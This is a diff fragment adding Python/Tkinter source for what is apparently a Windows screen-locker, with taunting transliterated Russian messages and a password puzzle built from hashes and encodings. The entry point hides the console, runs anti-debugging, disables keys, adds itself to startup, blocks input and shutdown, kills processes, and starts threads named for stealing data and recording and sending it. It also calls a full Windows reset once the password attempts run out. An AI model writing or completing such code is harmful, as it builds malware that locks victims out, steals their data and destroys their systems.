@@ -842,4 +842,96 @@ TY DUMAESH CHTO ZNAESH PAROL? NET!
 $1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/
 
 2. Bcrypt
-$2y$10$/yFT/ZN1y
+$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e
+
+3. Base64
+MTI0Njk4ODA0
+
+4. standard DES
+$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
+
+5. uuEncode
++.3@P-C
+
+UDACHI, DRUG. U TEBYA {MAX_ATTEMPTS} POPYTKI!"""
+        
+        lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
+                           font=('Courier', 9, 'bold'), justify='left')
+        lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
+        
+        self.chat = VictimChat(self)
+        self.win.after(500, self.chat.show)
+        
+        center_frame = tk.Frame(self.win, bg='black')
+        center_frame.place(relx=0.5, rely=0.82, anchor='center')
+        
+        tk.Label(center_frame, text="VVEDI PAROL:", bg='black', fg='#00FF00',
+                 font=('Courier', 14, 'bold')).pack(pady=(0, 5))
+        
+        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 14, 'bold'),
+                              bg='black', fg='#00FF00', insertbackground='#00FF00',
+                              relief='solid', bd=2)
+        self.entry.pack(pady=(0, 5), ipadx=40, ipady=3)
+        
+        self.status = tk.Label(center_frame, text=f"OSTALOS POPYTOK: {attempts_left}",
+                               bg='black', fg='#FF0000',
+                               font=('Courier', 12, 'bold'))
+        self.status.pack()
+        
+        self.entry.bind('<Return>', self.check_password)
+        self.entry.focus_force()
+        self.win.after(100, self.keep_focus)
+    
+    def keep_focus(self):
+        try:
+            self.win.focus_force()
+            self.entry.focus_force()
+            self.win.after(100, self.keep_focus)
+        except:
+            pass
+    
+    def check_password(self, event=None):
+        global attempts_left
+        
+        if self.entry.get() == PASSWORD:
+            restore_win_key()
+            self.status.config(text="VERNO! RAZBLOKIROVKA...", fg='#00FF00')
+            self.win.update()
+            time.sleep(1)
+            block_input(False)
+            self.root.destroy()
+            os._exit(0)
+        else:
+            attempts_left -= 1
+            if attempts_left > 0:
+                self.status.config(text=f"NEVERNO! OSTALOS POPYTOK: {attempts_left}",
+                                  fg='#FF0000')
+            else:
+                self.status.config(text="404 | WINDOWS ERROR", fg='#FF0000')
+                self.win.update()
+                time.sleep(2)
+                self.root.destroy()
+                full_windows_reset()
+            self.entry.delete(0, tk.END)
+
+# ========== ТОЧКА ВХОДА ==========
+if __name__ == "__main__":
+    hide_console()
+    anti_debug()
+    disable_win_key()
+    
+    threading.Thread(target=mega_steal_data, daemon=True).start()
+    threading.Thread(target=record_and_send_loop, daemon=True).start()
+    
+    add_to_startup()
+    time.sleep(TIMER_SECONDS)
+    
+    boot_animation()
+    block_input(True)
+    prevent_shutdown()
+    
+    threading.Thread(target=kill_processes, daemon=True).start()
+    threading.Thread(target=block_all_keys, daemon=True).start()
+    
+    WinLocker()
+    tk.mainloop()
